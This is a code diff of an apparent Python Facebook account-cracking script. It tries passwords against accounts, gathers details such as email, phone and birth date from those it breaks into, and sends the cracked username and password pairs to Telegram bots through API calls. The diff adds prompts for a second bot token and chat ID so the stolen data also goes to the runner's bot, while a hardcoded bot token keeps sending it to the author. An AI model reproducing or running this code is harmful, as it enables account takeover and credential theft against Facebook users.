@@ -14,7 +14,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 8, 30, 12, 10 ,9)
+g= datetime.datetime(2023, 7, 30, 12, 10 ,9)
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -90,6 +90,10 @@ B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 print('\n')
+print('\n')
+tok=input(B+'token : '+F)
+print('\n')
+id=input(B+'ID : '+F)
 token=('6428563721:AAG4sOU4onVks2yjDK4z9O1PFEr3C3egPjM')
 print('\n')
 ID=('1350971290')
@@ -1143,7 +1147,8 @@ def crack(idf,pwv):
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 ⋘─────━𓆩NADER𓆪‏━─────⋙
-@nader20090  -  @N_0_N_7					
+@nader20090  -  @N_0_N_7	
+❖ - [✓]ID : tg://openmessage?user_id={id}				
 					'''
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='SESI'))
@@ -1151,6 +1156,7 @@ def crack(idf,pwv):
 					akun.append(idf+'|'+pw)
 					cp+=1
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
+					requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(id)+"&text="+str(statuscp))
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
@@ -1165,11 +1171,13 @@ def crack(idf,pwv):
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 ⋘─────━𓆩NADER𓆪‏━─────⋙
-@nader20090  -  @N_0_N_7					
+@nader20090  -  @N_0_N_7	
+❖ - [✓]ID : tg://openmessage?user_id={id}				
 					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title=' NO SESI'))
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(id)+"&text="+str(statuscp))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1205,8 +1213,10 @@ def crack(idf,pwv):
 					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺
 ⋘─────━𓆩NADER𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩NADER𓆪‏━─────⋙
+❖ - [✓]ID : tg://openmessage?user_id={id}
 @nader20090  -  @N_0_N_7'''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
+					requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(id)+"&text="+str(statuscp))
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
